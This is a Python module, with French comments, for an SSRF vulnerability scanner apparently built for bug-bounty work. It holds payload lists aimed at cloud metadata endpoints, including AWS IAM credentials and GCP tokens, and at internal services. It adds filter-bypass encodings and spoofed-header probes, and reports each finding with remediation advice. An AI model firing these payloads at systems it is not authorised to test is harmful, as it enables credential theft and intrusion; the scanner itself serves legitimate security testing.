"""Scanner SSRF avancé pour BountyStrike."""

from __future__ import annotations

import re
import time
import urllib.parse
from typing import Any

import requests

from .utils import (
    Finding,
    build_url_with_params,
    extract_params_from_url,
    get_base_url,
    normalize_url,
    safe_request,
)

SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "proxy", "feed", "host", "site",
    "html", "callback", "return", "next", "data", "reference", "file", "document",
    "folder", "root", "pg", "style", "pdf", "template", "php_path", "doc",
    "page", "cont", "window", "navigate", "open", "source", "src", "image",
    "img", "load", "fetch", "request", "endpoint", "api", "target", "link",
    "goto", "out", "view", "dir", "show", "content", "layout", "mod",
]

# Payloads SSRF — métadonnées cloud et bypass
SSRF_PAYLOADS: list[dict[str, Any]] = [
    # AWS
    {"url": "http://169.254.169.254/latest/meta-data/", "cloud": "AWS", "indicators": ["ami-id", "instance-id", "hostname"]},
    {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "cloud": "AWS", "indicators": ["AccessKeyId", "SecretAccessKey"]},
    {"url": "http://169.254.169.254/latest/user-data", "cloud": "AWS", "indicators": ["#!/", "bash", "cloud-init"]},
    # GCP
    {"url": "http://metadata.google.internal/computeMetadata/v1/", "cloud": "GCP", "indicators": ["instance", "project", "zone"]},
    {"url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", "cloud": "GCP", "indicators": ["access_token", "token_type"]},
    # Azure
    {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "cloud": "Azure", "indicators": ["compute", "network", "subscriptionId"]},
    # DigitalOcean
    {"url": "http://169.254.169.254/metadata/v1/", "cloud": "DigitalOcean", "indicators": ["droplet-id", "hostname", "region"]},
    # Alibaba
    {"url": "http://100.100.100.200/latest/meta-data/", "cloud": "Alibaba", "indicators": ["instance-id", "region-id"]},
    # Oracle
    {"url": "http://169.254.169.254/opc/v1/instance/", "cloud": "Oracle", "indicators": ["oci", "compartmentId"]},
    # Kubernetes
    {"url": "https://kubernetes.default.svc/api/v1/namespaces", "cloud": "Kubernetes", "indicators": ["items", "metadata", "Namespace"]},
    # Redis
    {"url": "http://127.0.0.1:6379/", "cloud": "Redis", "indicators": ["redis_version", "-ERR", "+PONG"]},
    # Internal services
    {"url": "http://127.0.0.1:22/", "cloud": "Internal", "indicators": ["SSH", "OpenSSH"]},
    {"url": "http://localhost:8080/", "cloud": "Internal", "indicators": ["admin", "dashboard", "login"]},
    {"url": "http://127.0.0.1:9200/", "cloud": "Elasticsearch", "indicators": ["cluster_name", "lucene_version"]},
    {"url": "http://127.0.0.1:27017/", "cloud": "MongoDB", "indicators": ["MongoDB"]},
]

# Bypass encodings pour contourner les filtres
SSRF_BYPASS_WRAPPERS = [
    lambda u: u,
    lambda u: u.replace(".", "%2e"),
    lambda u: u.replace("169.254", "2852039166"),  # Decimal IP
    lambda u: u.replace("127.0.0.1", "2130706433"),
    lambda u: u.replace("localhost", "127.0.0.1"),
    lambda u: u.replace("http://", "http://0x7f000001@"),  # Hex IP trick
    lambda u: u.replace("169.254.169.254", "0xa9fea9fe"),  # Hex metadata
    lambda u: f"http://[::ffff:169.254.169.254]{u.split('169.254.169.254')[-1]}",
    lambda u: u.replace("http://", "Http://"),
    lambda u: u.replace("http://", "hTtP://"),
    lambda u: f"http://spoofed.burpcollaborator.net@{u.split('//')[1]}" if "//" in u else u,
]


class SSRFScanner:
    """Scanner SSRF avancé — cloud metadata, bypass, blind SSRF."""

    def __init__(self, target: str, session: requests.Session, threads: int = 10):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.threads = threads
        self.findings: list[Finding] = []

    def run_full_scan(self, urls: list[str] | None = None) -> list[Finding]:
        """Lance tous les tests SSRF."""
        scan_urls = (urls or [self.target])[:10]

        for url in scan_urls:
            self._test_ssrf_params(url)
            self._test_ssrf_post(url)

        self._test_ssrf_headers()
        return self.findings

    def _test_ssrf_params(self, url: str) -> None:
        """Teste SSRF via paramètres GET avec bypass."""
        params = extract_params_from_url(url)
        base = url.split("?")[0]
        test_params = list(params.keys()) if params else SSRF_PARAMS[:12]

        for param in test_params[:8]:
            for payload_info in SSRF_PAYLOADS:
                payload_url = payload_info["url"]
                cloud = payload_info["cloud"]
                indicators = payload_info["indicators"]

                for wrapper in SSRF_BYPASS_WRAPPERS[:5]:
                    wrapped = wrapper(payload_url)
                    test_url = build_url_with_params(base, {param: wrapped})
                    resp = safe_request(self.session, "GET", test_url)
                    if not resp:
                        continue

                    for indicator in indicators:
                        if indicator.lower() in resp.text.lower():
                            self.findings.append(
                                Finding(
                                    title=f"SSRF {cloud} — paramètre '{param}'",
                                    severity="critical",
                                    category="SSRF",
                                    url=test_url,
                                    description=f"Accès aux métadonnées {cloud} via SSRF",
                                    evidence=f"Payload: {wrapped}, Indicator: {indicator}",
                                    remediation="Valider et restreindre les URLs côté serveur, bloquer les IPs internes",
                                )
                            )
                            return

                    # Détection par status code inhabituel
                    if resp.status_code in (200, 500) and len(resp.content) > 50:
                        if any(kw in resp.text.lower() for kw in ("metadata", "instance", "token", "credentials")):
                            self.findings.append(
                                Finding(
                                    title=f"SSRF potentiel ({cloud}) — paramètre '{param}'",
                                    severity="high",
                                    category="SSRF",
                                    url=test_url,
                                    description=f"Réponse suggérant un accès interne ({cloud})",
                                    evidence=resp.text[:300],
                                    remediation="Bloquer les requêtes vers les plages IP internes",
                                )
                            )
                            return

    def _test_ssrf_post(self, url: str) -> None:
        """Teste SSRF via POST JSON/XML."""
        post_endpoints = [url, f"{self.base_url}/api", f"{self.base_url}/fetch", f"{self.base_url}/proxy"]
        payloads_json = [
            {"url": "http://169.254.169.254/latest/meta-data/"},
            {"uri": "http://metadata.google.internal/computeMetadata/v1/"},
            {"path": "http://127.0.0.1:6379/"},
            {"target": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        ]

        for endpoint in post_endpoints:
            for payload in payloads_json:
                resp = safe_request(
                    self.session, "POST", endpoint,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )
                if not resp:
                    continue
                if any(kw in resp.text.lower() for kw in ("ami-id", "instance-id", "access_token", "metadata")):
                    self.findings.append(
                        Finding(
                            title="SSRF via POST JSON",
                            severity="critical",
                            category="SSRF",
                            url=endpoint,
                            description="SSRF déclenché via corps JSON POST",
                            evidence=f"Payload: {payload}, Response: {resp.text[:200]}",
                            remediation="Valider les URLs dans les corps de requête POST",
                        )
                    )
                    return

    def _test_ssrf_headers(self) -> None:
        """Teste SSRF via headers (Referer, X-Forwarded-For, etc.)."""
        ssrf_headers = {
            "X-Forwarded-For": "http://169.254.169.254/latest/meta-data/",
            "X-Original-URL": "/admin",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Forwarded-Host": "169.254.169.254",
            "X-Real-IP": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-ProxyUser-Ip": "127.0.0.1",
            "Referer": "http://169.254.169.254/latest/meta-data/",
        }

        for header, value in ssrf_headers.items():
            resp = safe_request(self.session, "GET", self.target, headers={header: value})
            if not resp:
                continue

            if header.startswith("X-Original") and resp.status_code == 200:
                if "admin" in resp.text.lower() or "dashboard" in resp.text.lower():
                    self.findings.append(
                        Finding(
                            title=f"Bypass via {header}",
                            severity="high",
                            category="SSRF",
                            url=self.target,
                            description=f"Header {header} permet un bypass d'accès",
                            evidence=f"{header}: {value}",
                            remediation="Ne pas faire confiance aux headers X-Original-URL",
                        )
                    )

            if "ami-id" in resp.text or "instance-id" in resp.text:
                self.findings.append(
                    Finding(
                        title=f"SSRF via header {header}",
                        severity="critical",
                        category="SSRF",
                        url=self.target,
                        description=f"Le header {header} déclenche une requête SSRF",
                        evidence=resp.text[:200],
                        remediation="Ignorer les headers contrôlables par l'utilisateur",
                    )
                )

    def test_blind_ssrf(self, param: str, base_url: str) -> bool:
        """Détecte SSRF aveugle via timing (requête lente)."""
        slow_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22/",
        ]
        baseline_start = time.time()
        safe_request(self.session, "GET", base_url)
        baseline = time.time() - baseline_start

        for slow_url in slow_urls:
            test_url = build_url_with_params(base_url, {param: slow_url})
            start = time.time()
            safe_request(self.session, "GET", test_url, timeout=15)
            elapsed = time.time() - start

            if elapsed > baseline + 3:
                self.findings.append(
                    Finding(
                        title=f"SSRF aveugle (timing) — paramètre '{param}'",
                        severity="high",
                        category="SSRF (Blind)",
                        url=test_url,
                        description=f"Délai de réponse anormal ({elapsed:.1f}s) — SSRF aveugle possible",
                        evidence=f"Baseline: {baseline:.1f}s, Delayed: {elapsed:.1f}s",
                        remediation="Utiliser un outil OOB (Burp Collaborator, interactsh)",
                    )
                )
                return True
        return False
